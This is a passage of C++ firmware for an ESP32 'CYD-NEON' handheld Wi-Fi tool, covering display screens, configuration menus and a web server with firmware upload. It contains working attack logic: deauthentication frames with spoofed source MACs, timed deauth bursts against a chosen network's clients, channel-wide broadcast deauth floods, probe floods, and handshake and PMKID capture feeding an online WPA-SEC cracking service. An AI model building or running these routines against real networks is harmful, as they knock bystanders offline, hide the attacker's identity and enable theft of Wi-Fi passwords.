    for (int py = 0; py < wfH; py++) {
      uint8_t level = 0;
      if (py < scopeWaterfallRows) {
        level = scopeWaterfall[ch][py];
      }
      tft.fillRect(x, wfTopY + py, colW, 1, scopeWaterfallColor(level));
    }
    if ((ch + 1) == 1 || (ch + 1) == 6 || (ch + 1) == 11 || (ch + 1) == 13) {
      char cbuf[4];
      snprintf(cbuf, sizeof(cbuf), "%d", ch + 1);
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.drawString(cbuf, x, wfBottomY + 2);
    }
  }
}

static void scopeTick() {
  if (screen != ScreenId::SCOPE_GRAPH) return;
  if (wifiIsScanning) return;

  uint32_t now = millis();
  if (now - scopeLastScanMs < 4000) return;

  doWifiScanBlocking();
  scopePushWaterfallFrame();
  scopeLastScanMs = millis();
  drawScopeGraph();
}

// Stop currently active automation mode and clean up resources
// Wrapper for applying spoof to deauth frames (called by JAMMIT/deauth logic)
static void applyDeauthSpoofing(uint8_t* frame, int frameLen) {
  if (!frame || frameLen < 26) return;
  
  uint8_t spoofedSrc[6];
  applyActiveSpoofMode(spoofedSrc);
  
  // Apply spoofing to source MAC (offset 10 in deauth frame)
  memcpy(frame + 10, spoofedSrc, 6);
  
  if (activeSpoofMode == SpoofMode::MAC_POOL) {
    addMacToPool(spoofedSrc);  // Track spoofed MACs for pool rotation
  }
}

// Export threat assessment data to SD card (for Android app analysis)
static void exportThreatDataToSD() {
  // Threat data export disabled - DRAM buffer removed to make room for LED victory flash
  // Threat analysis is still logged via serial [THREAT] messages
  Serial.printf("[threat] Threat export stub (buffer removed for LED flash feature)\n");
}

static void disengageAutoMode() {
  if (autoMode == AutoMode::NONE) return;
  
  Serial.printf("[auto] stopping %s mode\n", autoModeStr(autoMode));
  
  // Stop packet capture and close files
  rawCaptureActive = false;
  pcapCaptureActive = false;
  
  // Stop deauth for JAMMIT and Y0INK
  if (autoMode == AutoMode::JAMMIT) {
    // Write session summary to log before stopping
    if (sdReady && jammitSessionLogPath[0] != '\0') {
      File f = SD.open(jammitSessionLogPath, FILE_APPEND);
      if (f) {
        uint32_t elapsed = millis() - jammitSessionStartMs;
        f.printf("--- Session ended: elapsed=%lu.%03lus deauths=%lu clients=%d ---\n",
                 elapsed / 1000, elapsed % 1000,
                 (unsigned long)jammitDeauthCount, (int)jammitClientCount);
        f.close();
      }
    }
    // Tear down STA+WSL WiFi
    stopJammitWifi();
    jammitLastTickMs = 0;
    jammitDeauthCount = 0;
    jammitClientCount = 0;
    s_jammitBssidCached = false;
  } else if (autoMode == AutoMode::Y0INK) {
    YoinkEngine::stop();
    yoinkLastTickMs = 0;
    yoinkDeauthCount = 0;
  } else if (autoMode == AutoMode::PROBE_FLOOD || autoMode == AutoMode::DEAUTH_FLOOD) {
    // Stop Bruce attack (PROBE_FLOOD, DEAUTH_FLOOD)
    bruceStopAttack();
  }
  
  // Clear mode
  autoMode = AutoMode::NONE;
}

static void engageAutoMode(AutoMode mode) {
  // Stop any currently active mode first
  if (autoMode != AutoMode::NONE) {
    disengageAutoMode();
  }
  
  if (!hasTarget) {
    Serial.printf("[auto] %s: no target\n", autoModeStr(mode));
    return;
  }

  autoMode = mode;
  lockChannel = true;
  // JAMMIT and Y0INK manage their own WiFi setup (STA+WSL bypass)
  // Skip startSniff() (which uses AP mode) for those modes
  if (!sniffActive && mode != AutoMode::Y0INK && mode != AutoMode::JAMMIT && mode != AutoMode::SCOPE) {
    startSniff();
  }

  rawCaptureActive = (mode == AutoMode::RAW || mode == AutoMode::JAMMIT);
  pcapCaptureActive = (mode == AutoMode::RAW || mode == AutoMode::JAMMIT || mode == AutoMode::Y0INK);
  if (rawCaptureActive) rawLastLogMs = 0;
  if (pcapCaptureActive && sdReady && !pcapFilesOpen) initCaptureFiles();

  if (mode == AutoMode::Y0INK) {
    // === NEW YOINK ENGINE ===
    // YoinkEngine sets up its own WiFi (STA+promisc+WSL bypass)
    // It does NOT use the old startSniff() / AP-mode approach
    YoinkEngine::setLogCallback(yoinkLogCallback);
    YoinkEngine::start();
    pushConsoleEvent("INFO", "AUTO", "Y0INK v2 engaged: OINK state machine + WSL bypass");
    Serial.println("[auto] Y0INK v2 engaged: OINK state machine + WSL bypass");
    yoinkLastTickMs = 0;
    yoinkLastPkts = 0;
    yoinkClientCount = 0;
    yoinkHandshakeCaptureCount = 0;
    yoinkLastDeauthMs = millis();
    yoinkDeauthCount = 0;
  } else if (mode == AutoMode::RAW) {
    Serial.println("[auto] RAW engaged (logging snapshots)");
  } else if (mode == AutoMode::SCOPE) {
    scopeResetWaterfall();
    scopeLastScanMs = 0;
    scopeLastDrawMs = 0;
    Serial.println("[auto] SCOPE engaged (AP waterfall graph)");
  } else if (mode == AutoMode::JAMMIT) {
    jammitLastTickMs = 0;
    jammitLastPkts = 0;
    jammitLastDeauthMs = 0;
    jammitDeauthCount = 0;
    jammitLastScore = 0;
    jammitClientCount = 0;
    jammitSessionStartMs = millis();
    memset(jammitClientMacs, 0, sizeof(jammitClientMacs));
    // Cache target BSSID bytes for fast ISR-side comparison
    s_jammitBssidCached = macFromString(target.bssid.c_str(), s_jammitTargetBssid);
    // Create session log + deauth PCAP on SD
    jammitInitSaveFiles();
    // Start WiFi in STA+WSL+promisc mode (overrides AP mode from startSniff)
    startJammitWifi();
    // Enable capture tracking
    rawCaptureActive = true;
    pcapCaptureActive = true;
    if (sdReady && !pcapFilesOpen) initCaptureFiles();
    jammitLog("JAMMIT engaged: target='%s' ch=%d — WSL+STA+promisc",
              target.ssid.c_str(), target.channel);
    jammitLog("Deauth bursts every 2s: broadcast + targeted per-client via WSL");
  } else if (mode == AutoMode::PROBE_FLOOD) {
    // === PROBE FLOOD: Wake sleeping clients with probe requests ===
    // Enable PCAP capture to log probe responses
    if (!sniffActive) startSniff();
    rawCaptureActive = true;
    pcapCaptureActive = true;
    if (sdReady && !pcapFilesOpen) initCaptureFiles();
    // Start probe flood via Bruce
    bruceStartProbeFlood(target.ssid.c_str(), target.channel, justGoModeDurationMs(AutoMode::PROBE_FLOOD));
    Serial.printf("[auto] PROBE_FLOOD engaged: '%s' ch=%d\n", target.ssid.c_str(), target.channel);
  } else if (mode == AutoMode::DEAUTH_FLOOD) {
    // === DEAUTH_FLOOD: Broadcast deauth to all devices on channel ===
    // CHAOS mode: aggressive channel-wide deauth
    if (!sniffActive) startSniff();
    rawCaptureActive = true;
    pcapCaptureActive = true;
    if (sdReady && !pcapFilesOpen) initCaptureFiles();
    // Start broadcast deauth flood
    bruceStartDeauthBroadcast(target.channel, justGoModeDurationMs(AutoMode::DEAUTH_FLOOD));
    Serial.printf("[auto] DEAUTH_FLOOD engaged: ch=%d (broadcast to all)\n", target.channel);
  }
}


static void drawConfigRow(const char* label, int y, const char* value) {
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString(label, 10, y);

  tft.setTextDatum(TR_DATUM);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(value, tft.width() - 10, y);
}

static void drawConfig() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Config");
  drawUniversalBackground();

  const bool compact = (tft.height() <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int pad = content.x + 4;
  const int gap = compact ? 4 : 10;
  const int cols = 2;
  const int bh = compact ? 22 : 34;
  const int bw = (content.w - 8 - gap) / cols;
  const int top = content.y + (compact ? 0 : 2);

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  if (!compact) {
    // Fill the top-left header band with a quick summary.
    const int panelX = 8;
    const int panelY = 34;
    const int panelW = max(120, hypercubeBoxX - panelX - 6);
    const int panelH = max(20, content.y - panelY - 4);
    tft.drawRoundRect(panelX, panelY, panelW, panelH, 6, TFT_DARKGREY);
    tft.fillRoundRect(panelX + 1, panelY + 1, panelW - 2, panelH - 2, 6, TFT_BLACK);
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Adapter | WiFi Link | Web + AP", panelX + 5, panelY + 4);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Startup | Telemetry | LED", panelX + 5, panelY + 14);
  } else {
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("BTN1=Next  BTN2=Select", content.x + 2, content.y - 10);
  }

  btnCfgWifi = {pad, top, bw, bh, compact ? "Adapter" : "Adapter"};
  drawButton(btnCfgWifi, TFT_DARKCYAN, TFT_MAGENTA, TFT_WHITE);

  btnCfgWifiConnect = {pad + bw + gap, top, bw, bh, compact ? "WiFi" : "WiFi Link"};
  drawButton(btnCfgWifiConnect, TFT_DARKCYAN, TFT_CYAN, TFT_WHITE);

  btnCfgWebserver = {pad, top + bh + gap, bw, bh, compact ? "Web/AP" : "Web + AP"};
  drawButton(btnCfgWebserver, TFT_NAVY, TFT_GREEN, TFT_WHITE);

  btnCfgStartup = {pad + bw + gap, top + bh + gap, bw, bh, "Startup"};
  drawButton(btnCfgStartup, TFT_DARKGREY, TFT_YELLOW, TFT_WHITE);

  btnCfgTelemetry = {pad, top + ((bh + gap) * 2), bw, bh, compact ? "Telem" : "Telemetry"};
  drawButton(btnCfgTelemetry, TFT_DARKGREY, TFT_CYAN, TFT_WHITE);

  btnCfgLed = {pad + bw + gap, top + ((bh + gap) * 2), bw, bh, compact ? "LED" : "LED Control"};
  drawButton(btnCfgLed, TFT_DARKGREY, TFT_YELLOW, TFT_WHITE);

  uiLogLayout("drawConfig", content, bottom);
  uiLogButtonRect("Config.Back", btnBack);
  drawBorder();
}

static void drawStartupConfig() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Startup");
  drawUniversalBackground();

  const bool compact = (tft.height() <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int w = tft.width();

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  const int row1Y = compact ? (content.y + 4) : (content.y + 28);
  const int row2Y = compact ? (content.y + 34) : (content.y + 82);
  const int btnY1 = compact ? (content.y + 2) : (content.y + 20);
  const int btnY2 = compact ? (content.y + 32) : (content.y + 74);
  const int btnW = compact ? 90 : 114;
  const int btnH = compact ? 26 : 34;
  const int btnX = w - (btnW + 12);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Reconnect prompt on boot", content.x + 4, row1Y);

  btnStartupAutoReconnect = {btnX, btnY1, btnW, btnH, cfg.startup_autoReconnectPrompt ? "ON" : "OFF"};
  drawButton(btnStartupAutoReconnect,
             cfg.startup_autoReconnectPrompt ? TFT_DARKGREEN : TFT_MAROON,
             TFT_CYAN,
             TFT_WHITE);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Default channel lock", content.x + 4, row2Y);

  btnStartupDefaultLockToggle = {btnX, btnY2, btnW, btnH, cfg.wifi_defaultLockChannel ? "ON" : "OFF"};
  drawButton(btnStartupDefaultLockToggle,
             cfg.wifi_defaultLockChannel ? TFT_DARKGREEN : TFT_MAROON,
             TFT_MAGENTA,
             TFT_WHITE);

  if (!compact) {
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Saved to /config.json", content.x + 4, content.y + 138);
  }

  uiLogLayout("drawStartupConfig", content, bottom);
  uiLogButtonRect("Startup.Back", btnBack);
  drawBorder();
}

static void drawTelemetryConfig() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Telemetry");
  drawUniversalBackground();

  const bool compact = (tft.height() <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int w = tft.width();

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  const int label1Y = compact ? (content.y + 2) : (content.y + 24);
  const int valueY = compact ? (content.y + 14) : (content.y + 40);
  const int btnRowY = compact ? (content.y + 24) : (content.y + 60);
  const int verbLabelY = compact ? (content.y + 54) : (content.y + 114);
  const int verbBtnY = compact ? (content.y + 50) : (content.y + 104);
  const int toggleW = compact ? 90 : 114;
  const int toggleH = compact ? 26 : 34;
  const int toggleX = w - (toggleW + 12);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Monitor refresh interval", content.x + 4, label1Y);

  char v[24];
  snprintf(v, sizeof(v), "%d ms", cfg.telemetry_monitorIntervalMs);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(v, content.x + 4, valueY);

  btnTelemetryMinus = {content.x + 4, btnRowY, 56, compact ? 26 : 34, "-"};
  btnTelemetryPlus  = {content.x + 66, btnRowY, 56, compact ? 26 : 34, "+"};
  drawButton(btnTelemetryMinus, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnTelemetryPlus,  TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Verbose serial logs", content.x + 4, verbLabelY);
  btnTelemetryVerboseToggle = {toggleX, verbBtnY, toggleW, toggleH, cfg.telemetry_verboseSerial ? "ON" : "OFF"};
  drawButton(btnTelemetryVerboseToggle,
             cfg.telemetry_verboseSerial ? TFT_DARKGREEN : TFT_MAROON,
             TFT_CYAN,
             TFT_WHITE);

  uiLogLayout("drawTelemetryConfig", content, bottom);
  uiLogButtonRect("Telemetry.Back", btnBack);
  drawBorder();
}

static void drawLedControl() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("LED Control");
  drawUniversalBackground();

  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  ledEnsureHueInitialized();
  ledUpdateRgbFromHue();
  applyStatusLedState(ledBrightness, ledRed, ledGreen, ledBlue);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Physical CYD status LED calibration", content.x + 4, content.y + 2);
  drawLedControlDynamic();

  uiLogLayout("drawLedControl", content, bottom);
  uiLogButtonRect("Led.Back", btnBack);
  drawBorder();
}

static void drawWifiConfig() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Adapter Config");
  drawUniversalBackground();

  const bool compact = (tft.height() <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int h = tft.height();

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  btnSave = {bottom.x + 98, bottom.y, 92, UI_BUTTON_H, "Save"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnSave, configDirty ? TFT_ORANGE : TFT_DARKGREY, TFT_WHITE, TFT_BLACK);

  int y = content.y + (compact ? 2 : 8);
  const int rowGap = compact ? 34 : 56;
  const int adjustBtnH = compact ? 24 : 30;

  char hopVal[24];
  snprintf(hopVal, sizeof(hopVal), "%d ms", cfg.wifi_channelHopInterval);
  drawConfigRow("Hop interval", y, hopVal);
  btnHopMinus = {10, y + (compact ? 14 : 18), 52, adjustBtnH, "-"};
  btnHopPlus  = {70, y + (compact ? 14 : 18), 52, adjustBtnH, "+"};
  drawButton(btnHopMinus, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnHopPlus,  TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  y += rowGap;

  char scanVal[24];
  snprintf(scanVal, sizeof(scanVal), "%d ms", cfg.wifi_scanDuration);
  drawConfigRow("Scan duration", y, scanVal);
  btnScanMinus = {10, y + (compact ? 14 : 18), 52, adjustBtnH, "-"};
  btnScanPlus  = {70, y + (compact ? 14 : 18), 52, adjustBtnH, "+"};
  drawButton(btnScanMinus, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnScanPlus,  TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  y += rowGap;

  if (compact) {
    btnDeauthToggle = {10, y + 6, 96, 24, cfg.wifi_enableDeauth ? "Deauth ON" : "Deauth OFF"};
    btnWifiDefaultLockToggle = {112, y + 6, 96, 24, cfg.wifi_defaultLockChannel ? "Lock ON" : "Lock OFF"};
    drawButton(btnDeauthToggle, cfg.wifi_enableDeauth ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);
    drawButton(btnWifiDefaultLockToggle, cfg.wifi_defaultLockChannel ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);
  } else {
    drawConfigRow("WiFi: enable deauth", y, cfg.wifi_enableDeauth ? "ON" : "OFF");
    btnDeauthToggle = {10, y + 18, 110, 30, cfg.wifi_enableDeauth ? "ON" : "OFF"};
    drawButton(btnDeauthToggle, cfg.wifi_enableDeauth ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);
    y += rowGap;

    drawConfigRow("WiFi: default lock", y, cfg.wifi_defaultLockChannel ? "ON" : "OFF");
    btnWifiDefaultLockToggle = {10, y + 18, 110, 30, cfg.wifi_defaultLockChannel ? "ON" : "OFF"};
    drawButton(btnWifiDefaultLockToggle, cfg.wifi_defaultLockChannel ? TFT_DARKGREEN : TFT_MAROON, TFT_WHITE, TFT_WHITE);

    y += rowGap;
    const char* savedSsid = cfg.wifi_ssid.isEmpty() ? "(not set)" : cfg.wifi_ssid.c_str();
    drawConfigRow("WiFi: saved network", y, savedSsid);
  }

  if (compact) {
    tft.setTextDatum(BL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("BTN1=Next  BTN2=Select", 6, h - 6);
  } else {
    tft.setTextDatum(BL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("Config stored in /config.json (LittleFS). Run: pio run -t uploadfs", 6, h - 6);
  }

  uiLogLayout("drawWifiConfig", content, bottom);
  uiLogButtonRect("WifiCfg.Back", btnBack);
  uiLogButtonRect("WifiCfg.Save", btnSave);
  drawBorder();
}

// Forward declarations for web routes
static void syncWithWPASec();
static void downloadWPASecResults();

// ---------- WiFi Connect Screen ----------
static void connectToWifi(const String& ssid, const String& password) {
  wifiConnectStart(
    ssid,
    password,
    wifiConnectStatus,
    wifiConnectInProgress,
    wifiConnectAttemptMs,
    wifiConnectSsid,
    wifiConnectPassword,
    pushConsoleEventf
  );
}

static void startAPMode() {
  if (apMode) {
    // Stop AP
    apMode = false;
    Serial.println("[wifi] Stopping AP mode");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    wifiConnectStatus = "AP stopped";
    Serial.println("[wifi] AP stopped");
    pushConsoleEvent("INFO", "AP", "AP stopped");
    return;
  }

  apMode = true;
  Serial.printf("[wifi] Starting AP mode: SSID='%s', auth=%s\n", 
                apSsid.c_str(), 
                apPassword.isEmpty() ? "OPEN" : "WPA2");

  // Stop any existing connections
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("[wifi] Disconnecting from existing STA connection");
    WiFi.disconnect();
    delay(100);
  }

  // Start AP mode
  WiFi.mode(WIFI_AP);
  delay(100);

  bool apStarted;
  if (apPassword.isEmpty()) {
    Serial.printf("[wifi] Starting AP with no password, channel 1, 4 max clients\n");
    apStarted = WiFi.softAP(apSsid.c_str(), NULL, 1, false, 4);
  } else {
    Serial.printf("[wifi] Starting AP with password, channel 1, 4 max clients\n");
    apStarted = WiFi.softAP(apSsid.c_str(), apPassword.c_str(), 1, false, 4);
  }

  delay(500);
  
  if (apStarted) {
    wifiConnectStatus = "AP Active: " + apSsid;
    Serial.printf("[wifi] AP started successfully. IP: %s\n", WiFi.softAPIP().toString().c_str());
    pushConsoleEventf("INFO", "AP", "AP started ssid='%s' ip=%s", apSsid.c_str(), WiFi.softAPIP().toString().c_str());
  } else {
    apMode = false;
    wifiConnectStatus = "AP failed to start";
    Serial.println("[wifi] ERROR: AP startup failed");
    pushConsoleEvent("ERROR", "AP", "AP failed to start");
  }
}

// Forward declaration — defined later alongside macFromString()
static int hexDecodePayload(const char* hex, uint8_t* out, int maxLen);

static bool confirmWebRiskAction(RiskyWebAction action, const char* actionLabel) {
  if (!webServerRunning) return true;

  uint32_t now = millis();
  const uint32_t confirmWindowMs = 5000;
  if (pendingRiskyWebAction == action && (now - pendingRiskyWebActionMs) <= confirmWindowMs) {
    pendingRiskyWebAction = RiskyWebAction::NONE;
    pendingRiskyWebActionMs = 0;
    return true;
  }

  pendingRiskyWebAction = action;
  pendingRiskyWebActionMs = now;

  char msg[168];
  snprintf(msg, sizeof(msg),
           "WARN: %s may disrupt WebServer/AP access. Tap same button again within 5s to confirm.",
           actionLabel ? actionLabel : "This action");
  wifiConnectStatus = msg;
  pushConsoleEvent("WARN", "WEB", msg);
  Serial.println(msg);
  return false;
}

static String escapeHtml(const String& in) {
  String out;
  out.reserve(in.length() + 16);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    if (c == '&') out += "&amp;";
    else if (c == '<') out += "&lt;";
    else if (c == '>') out += "&gt;";
    else if (c == '"') out += "&quot;";
    else out += c;
  }
  return out;
}

static String urlEncodeSimple(const String& in) {
  static const char* hex = "0123456789ABCDEF";
  String out;
  out.reserve(in.length() * 3);
  for (size_t i = 0; i < in.length(); i++) {
    uint8_t c = (uint8_t)in[i];
    bool safe = (c >= 'a' && c <= 'z') ||
                (c >= 'A' && c <= 'Z') ||
                (c >= '0' && c <= '9') ||
                c == '-' || c == '_' || c == '.' || c == '~' || c == '/';
    if (safe) out += (char)c;
    else {
      out += '%';
      out += hex[(c >> 4) & 0x0F];
      out += hex[c & 0x0F];
    }
  }
  return out;
}

static String normalizeSdWebPath(String path) {
  path.trim();
  path.replace('\\', '/');
  while (path.indexOf("//") >= 0) path.replace("//", "/");
  if (path.isEmpty()) path = "/";
  if (!path.startsWith("/")) path = "/" + path;
  if (path.indexOf("..") >= 0) return "";
  if (path.length() > 1 && path.endsWith("/")) path.remove(path.length() - 1);
  return path;
}

static String pathParent(const String& path) {
  if (path == "/") return "/";
  int cut = path.lastIndexOf('/');
  if (cut <= 0) return "/";
  return path.substring(0, cut);
}

static bool removeSdPathRecursive(const String& path) {
  if (path.isEmpty() || path == "/" || !SD.exists(path)) return false;
  File f = SD.open(path, FILE_READ);
  if (!f) return false;
  if (!f.isDirectory()) {
    f.close();
    return SD.remove(path);
  }

  while (true) {
    File child = f.openNextFile();
    if (!child) break;
    String childPath = child.name();
    if (!childPath.startsWith("/")) {
      childPath = path;
      if (!childPath.endsWith("/")) childPath += "/";
      childPath += child.name();
    }
    bool isDir = child.isDirectory();
    child.close();
    if (isDir) {
      if (!removeSdPathRecursive(childPath)) {
        f.close();
        return false;
      }
    } else {
      if (!SD.remove(childPath)) {
        f.close();
        return false;
      }
    }
  }
  f.close();
  return SD.rmdir(path);
}

static void startWebServer() {
  if (webServerRunning) {
    Serial.println("[web] WebServer already running");
    return;
  }

  webServerRunning = true;
  wifiConnectStatus = "Starting WebServer...";

  Serial.printf("[web] Starting WebServer on port %d\n", webServerPort);

  // Root handler - OTA + companion app + WPA-SEC quick links
  webServer.on("/", HTTP_GET, [](){ 
    Serial.println("[web] GET /");
    bool sdOk = sdReady || mountSdCard(false);
    bool hasApk = sdOk && SD.exists(androidApkPath);
    bool hasWpaResults = sdOk && SD.exists(wpasecResultsPath);

    String appBlock =
      "<h2>Android Companion</h2>"
      "<p>Manage install page and APK from this device.</p>"
      "<p><a href='/android'><button type='button'>Android Install Page</button></a></p>";
    if (hasApk) {
      appBlock += "<p><a href='/android.apk'>Direct APK Download</a></p>";
    } else {
      appBlock += "<p>APK not found on SD: /CYDCompanion.apk (upload from install page).</p>";
    }

    String wpaBlock;
    if (cfg.wpasec_apikey.isEmpty()) {
      wpaBlock =
        "<h2>WPA-SEC</h2>"
        "<p>API key is not configured on device.</p>"
        "<p><a href='/wpasec/config'><button type='button'>Configure API Key</button></a></p>";
    } else {
      wpaBlock =
        "<h2>WPA-SEC</h2>"
        "<p>Push captures and pull cracked results.</p>"
        "<p><a href='/wpasec'><button type='button'>WPA-SEC Console</button></a> "
        "<a href='/wpasec/config'><button type='button'>Edit Config</button></a></p>";
      if (hasWpaResults) {
        wpaBlock += "<p><a href='/wpasec/results'>View Local Results</a></p>";
      }
      wpaBlock += "<p><a href='https://wpa-sec.stanev.org/' target='_blank'>Open WPA-SEC Portal</a></p>";
    }

    String toolsBlock =
      "<h2>Pentest Quick Links</h2>"
      "<p><a href='/android'>Android Companion</a> | "
      "<a href='/wpasec'>WPA-SEC Console</a></p>"
      "<p><a href='/sd'>SD File Manager</a></p>"
      "<p><a href='/android.apk'>Download APK</a> | "
      "<a href='/wpasec/results/download'>Download WPA-SEC Results</a></p>";

    String html = R"(<!DOCTYPE html>
<html>
<head>
  <title>CYD OTA Update</title>
  <style>
    body { font-family: Arial; margin: 20px; background: #1a1a1a; color: #fff; }
    h1 { color: #00ff00; }
    h2 { color: #00d4ff; margin-top: 26px; }
    form { margin: 20px 0; padding: 20px; background: #222; border-radius: 5px; }
    input { padding: 8px; margin: 5px; }
    button { padding: 10px 20px; background: #00ff00; color: #000; border: none; cursor: pointer; }
    button:hover { background: #00cc00; }
    .box { margin: 14px 0; padding: 14px; background: #222; border-radius: 6px; }
    a { color: #79d7ff; }
  </style>
</head>
<body>
  <h1>CYD OTA Firmware Update</h1>
  <p>Upload a new firmware binary to update the device.</p>
  <form method='POST' action='/update' enctype='multipart/form-data'>
    <input type='file' name='update' accept='.bin' required>
    <button type='submit'>Update Firmware</button>
  </form>
</body>
</html>)";
    int insertPos = html.lastIndexOf("</body>");
    if (insertPos < 0) insertPos = html.length();
    html = html.substring(0, insertPos) +
      "<div class='box'>" + appBlock + "</div>" +
      "<div class='box'>" + wpaBlock + "</div>" +
      "<div class='box'>" + toolsBlock + "</div>" +
      html.substring(insertPos);
    webServer.send(200, "text/html", html);
  });

  webServer.on("/api/status", HTTP_GET, [](){
    JsonDocument doc;
    doc["ok"] = true;
    doc["name"] = "CYD-NEON";
    doc["mode"] = (int)screen;
    doc["autoMode"] = autoModeStr(autoMode);
    doc["sniffActive"] = sniffActive;
    doc["lockChannel"] = lockChannel;
    doc["apMode"] = apMode;
    doc["webServer"] = webServerRunning;
    doc["sdReady"] = sdReady;
    doc["packets"] = sniffPacketCount;
    doc["beacons"] = monBeaconHits;
    doc["handshakes"] = monHandshakeHits;
    doc["ip_sta"] = WiFi.localIP().toString();
    doc["ip_ap"] = WiFi.softAPIP().toString();
    // YOINK status if active
    if (autoMode == AutoMode::Y0INK && YoinkEngine::isRunning()) {
      JsonObject yoink = doc["yoink"].to<JsonObject>();
      yoink["state"] = YoinkEngine::getStateStr();
      yoink["hs"] = YoinkEngine::getHandshakeCount();
      yoink["pmkid"] = YoinkEngine::getPmkidCount();
      yoink["nets"] = YoinkEngine::getNetworkCount();
      yoink["deauths"] = YoinkEngine::getDeauthCount();
      yoink["target"] = YoinkEngine::getTargetSSID();
    }
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  // Android Companion: show a temporary on-device badge while the phone is pulling from SD.
  // Use a TTL so the badge clears automatically if the app disconnects mid-transfer.
  webServer.on("/api/companion/sync", HTTP_GET, [](){
    const uint32_t now = millis();
    const bool hasActive = webServer.hasArg("active") || webServer.hasArg("on");
    const int active = hasActive ? (webServer.hasArg("active") ? webServer.arg("active").toInt() : webServer.arg("on").toInt()) : 1;
    const uint32_t ttlMs = webServer.hasArg("ttl") ? (uint32_t)webServer.arg("ttl").toInt() : 20000U;

    if (active != 0) {
      companionSyncUntilMs = now + ttlMs;
    } else {
      companionSyncUntilMs = 0;
    }

    // Draw immediately (in addition to periodic HUD ticks)
    drawCompanionSyncBadgeTick();

    JsonDocument doc;
    doc["ok"] = true;
    doc["active"] = (companionSyncUntilMs != 0) && ((int32_t)(companionSyncUntilMs - now) > 0);
    doc["ttl_ms"] = ttlMs;
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/api/console", HTTP_GET, [](){
    uint32_t since = (uint32_t)webServer.arg("since").toInt();
    int limit = webServer.hasArg("limit") ? webServer.arg("limit").toInt() : 80;
    if (limit < 1) limit = 1;
    if (limit > 200) limit = 200;

    JsonDocument doc;
    doc["ok"] = true;
    doc["next_seq"] = consoleSeq + 1;
    JsonArray lines = doc["lines"].to<JsonArray>();

    uint16_t emitted = 0;
    for (uint16_t i = 0; i < CONSOLE_RING_SIZE && emitted < (uint16_t)limit; i++) {
      const ConsoleEvent& e = consoleRing[(consoleHead + i) % CONSOLE_RING_SIZE];
      if (e.seq == 0 || e.seq <= since) continue;
      JsonObject o = lines.add<JsonObject>();
      o["seq"] = e.seq;
      o["ms"] = e.ms;
      o["level"] = e.level;
      o["tag"] = e.tag;
      o["msg"] = e.msg;
      emitted++;
    }
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/api/packets", HTTP_GET, [](){
    uint32_t since = (uint32_t)webServer.arg("since").toInt();
    int limit = webServer.hasArg("limit") ? webServer.arg("limit").toInt() : 120;
    if (limit < 1) limit = 1;
    if (limit > 260) limit = 260;

    JsonDocument doc;
    doc["ok"] = true;
